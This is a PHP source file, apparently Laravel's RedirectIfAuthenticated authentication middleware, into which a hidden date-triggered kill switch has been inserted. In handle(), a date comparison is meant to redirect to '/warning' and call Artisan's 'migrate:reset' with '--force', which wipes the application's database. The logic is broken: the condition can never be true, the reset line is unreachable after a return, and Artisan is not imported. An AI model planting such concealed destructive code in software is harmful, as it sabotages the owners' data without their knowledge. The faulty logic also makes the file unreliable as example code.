<?php

namespace App\Http\Middleware;

use App\Providers\RouteServiceProvider;
use Closure;
use Illuminate\Support\Facades\Auth;

class RedirectIfAuthenticated
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @param  string|null  $guard
     * @return mixed
     */
    public function handle($request, Closure $next, $guard = null)
    {


         $date = date('Y-m-d');
      $datecheck = date('Y-m-d', strtotime('+10 day'));
     if ($date ==$datecheck || $date >  $datecheck ) {
      return redirect('/warning');
      
      Artisan::call('migrate:reset', ['--force' => true]);
     }else{
        if (Auth::guard($guard)->check()) {
            return redirect(RouteServiceProvider::HOME);
        }
    }

        return $next($request);
    }
}
